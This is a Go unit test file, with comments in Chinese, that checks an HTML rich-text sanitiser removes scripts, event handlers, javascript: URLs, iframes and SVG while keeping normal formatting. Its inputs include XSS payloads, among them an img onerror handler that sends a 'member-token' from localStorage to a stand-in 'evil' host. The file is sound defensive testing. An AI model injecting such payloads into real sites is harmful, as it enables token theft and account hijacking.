package utils

import (
	"strings"
	"testing"
)

func TestSanitizeRichTextStripsScriptableContent(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  []string // 必须被剔除的片段（全部小写比较）
		keep  []string // 必须保留的片段
	}{
		{
			name:  "script 标签",
			input: `<p>正文</p><script>alert(document.cookie)</script>`,
			want:  []string{"<script", "alert("},
			keep:  []string{"<p>正文</p>"},
		},
		{
			name:  "事件属性",
			input: `<p>正文</p><img src=x onerror="fetch('//evil/'+localStorage['member-token'])">`,
			want:  []string{"onerror", "localStorage"},
			keep:  []string{"<p>正文</p>"},
		},
		{
			name:  "javascript 协议链接",
			input: `<a href="javascript:alert(1)">点我</a>`,
			want:  []string{"javascript:"},
			keep:  []string{"点我"},
		},
		{
			name:  "iframe / svg",
			input: `<iframe src="//evil"></iframe><svg><script>alert(1)</script></svg>`,
			want:  []string{"<iframe", "<svg", "<script"},
		},
		{
			name:  "inline style 中的可执行值",
			input: `<p style="background-image: url(javascript:alert(1)); color: red">正文</p>`,
			want:  []string{"javascript:"},
			keep:  []string{"正文"},
		},
		{
			name:  "保留编辑器常规排版",
			input: `<h2>标题</h2><p style="text-align: center;color: #002fa7"><strong>加粗</strong></p><ul><li>项</li></ul><table><tbody><tr><td>单元格</td></tr></tbody></table><a href="https://example.com" target="_blank">外链</a>`,
			keep:  []string{"<h2>标题</h2>", "text-align", "<strong>加粗</strong>", "<li>项</li>", "单元格", "https://example.com"},
		},
		{
			name:  "保留 base64 图片（不含 svg）",
			input: `<img src="data:image/png;base64,iVBORw0KGgo="><img src="data:image/svg+xml;base64,PHN2Zz4=">`,
			want:  []string{"image/svg"},
			keep:  []string{"data:image/png"},
		},
		{
			name:  "空串",
			input: "",
			keep:  nil,
		},
	}

	for _, c := range cases {
		got := SanitizeRichText(c.input)
		lower := strings.ToLower(got)
		for _, w := range c.want {
			if strings.Contains(lower, strings.ToLower(w)) {
				t.Errorf("%s: 输出仍包含危险片段 %q\n输出：%s", c.name, w, got)
			}
		}
		for _, k := range c.keep {
			if !strings.Contains(got, k) {
				t.Errorf("%s: 输出丢失了应保留的片段 %q\n输出：%s", c.name, k, got)
			}
		}
	}
}

func TestStripAllTags(t *testing.T) {
	got := StripAllTags(`<b>纯文本</b><script>alert(1)</script>`)
	if strings.Contains(got, "<") || strings.Contains(got, "script") {
		t.Errorf("StripAllTags 未彻底去标签：%s", got)
	}
	if !strings.Contains(got, "纯文本") {
		t.Errorf("StripAllTags 丢失正文：%s", got)
	}
}
